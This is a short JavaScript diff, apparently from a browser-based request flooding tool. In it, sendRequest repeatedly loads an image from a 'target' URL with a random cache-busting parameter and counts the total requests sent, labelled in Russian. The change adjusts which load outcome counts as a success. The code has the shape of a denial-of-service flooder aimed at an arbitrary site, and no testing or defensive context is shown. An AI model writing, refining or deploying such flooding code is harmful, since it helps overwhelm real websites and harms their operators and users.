@@ -68,8 +68,9 @@ function onSucceed(){
 }
 function sendRequest(){
 	var img = new Image();
-	img.onerror = function() {onSucceed();};
+	img.onerror = function() {onAbort();};
 	img.onabort = function() {onAbort();};
+	img.onload = function() {onSucceed();};
 	img.setAttribute("src", target + "?" + randomT() + "=" + Math.floor(Math.random()*2147483647));
 	sent++;
 	rSent.innerHTML = "Всего запросов: " + sent;
